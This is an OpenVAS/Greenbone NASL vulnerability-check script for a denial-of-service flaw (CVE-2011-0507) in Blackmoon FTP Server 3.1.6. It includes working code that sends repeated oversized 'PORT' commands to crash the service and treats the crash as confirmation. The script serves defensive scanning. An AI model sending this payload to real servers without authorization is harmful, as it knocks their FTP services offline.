# SPDX-FileCopyrightText: 2011 Greenbone AG
# Some text descriptions might be excerpted from (a) referenced
# source(s), and are Copyright (C) by the respective right holder(s).
#
# SPDX-License-Identifier: GPL-2.0-only

if(description)
{
  script_oid("1.3.6.1.4.1.25623.1.0.800194");
  script_version("2023-07-21T05:05:22+0000");
  script_tag(name:"last_modification", value:"2023-07-21 05:05:22 +0000 (Fri, 21 Jul 2023)");
  script_tag(name:"creation_date", value:"2011-01-21 14:38:54 +0100 (Fri, 21 Jan 2011)");
  script_cve_id("CVE-2011-0507");
  script_tag(name:"cvss_base", value:"4.3");
  script_tag(name:"cvss_base_vector", value:"AV:N/AC:M/Au:N/C:N/I:N/A:P");
  script_name("Blackmoon FTP PORT Command Denial Of Service Vulnerability");
  script_category(ACT_DENIAL);
  script_copyright("Copyright (C) 2011 Greenbone AG");
  script_family("FTP");
  script_dependencies("ftpserver_detect_type_nd_version.nasl");
  script_require_ports("Services/ftp", 21);
  script_mandatory_keys("ftp/blackmoon/detected");

  script_xref(name:"URL", value:"http://secunia.com/advisories/42933/");
  script_xref(name:"URL", value:"http://www.securityfocus.com/bid/45814");
  script_xref(name:"URL", value:"http://www.exploit-db.com/exploits/15986/");

  script_tag(name:"impact", value:"Successful exploitation will allow the remote attackers to cause a denial of
  service.");

  script_tag(name:"affected", value:"Blackmoon FTP 3.1.6 - Build 1735.");

  script_tag(name:"insight", value:"The flaw is due to an error while parsing PORT command, which can be
  exploited to crash the FTP service by sending multiple PORT commands with
  'big' parameter.");

  script_tag(name:"solution", value:"Upgrade to Blackmoon FTP Version 3.1.7 Build 17356 or higher.");

  script_tag(name:"summary", value:"Blackmoon FTP Server is prone to a denial of service (DoS) vulnerability.");

  script_tag(name:"solution_type", value:"VendorFix");
  script_tag(name:"qod_type", value:"remote_analysis");

  exit(0);
}

include("ftp_func.inc");
include("misc_func.inc");
include("port_service_func.inc");

ftpPort = ftp_get_port(default:21);
banner = ftp_get_banner(port:ftpPort);
if(!banner || "BlackMoon FTP Server" >!< banner){
  exit(0);
}

crafted_port_cmd = string('PORT ', crap(length:600, data:'A'));

for(i=0; i < 100; i++)
{
  soc = open_sock_tcp(ftpPort);

  ## BlackMoon FTP Server crashed, if it's not able to Open the socket
  if(!soc) {
    security_message(ftpPort);
    exit(0);
  }

  res1 = ftp_recv_line(socket:soc);
  res2 = ftp_send_cmd(socket:soc, cmd:crafted_port_cmd);

  ## Exit ; Patched FTP Server Response
  if("553 Requested action not taken (line too long)" >< res2){
    exit(0);
  }
  ftp_close(socket:soc);
}
